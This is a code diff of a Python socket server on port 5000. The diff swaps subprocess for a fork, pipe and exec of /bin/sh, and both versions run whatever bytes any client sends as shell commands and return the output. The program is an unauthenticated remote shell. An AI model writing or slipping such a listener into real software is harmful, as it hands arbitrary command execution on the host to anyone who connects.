@@ -1,5 +1,4 @@
 import socket
-import subprocess
 import os
 import sys
 import signal
@@ -10,8 +9,16 @@ PORT = 5000
 signal.signal(signal.SIGCHLD, signal.SIG_IGN)
 
 
-def run_cmd(cmd):
-    return subprocess.run(cmd, shell=True, capture_output=True).stdout
+def handle_client():
+    read_side, write_side = os.pipe()
+    recv_data = conn.recv(4096)
+
+    pid2 = os.fork()
+    if pid2:
+        conn.send(os.read(read_side, 100))
+    else:
+        os.dup2(write_side, 1)
+        os.execl("/bin/sh", "sh", "-c", recv_data)
 
 
 try:
@@ -33,10 +40,7 @@ try:
             conn.close()
         else:
             s.close()
-            recv_data = conn.recv(4096)
-            send_data = run_cmd(recv_data.decode("utf-8"))
-            conn.send(send_data)
-            print("Data received: %s" % recv_data)
+            handle_client()
             conn.close()
             sys.exit(0)
 
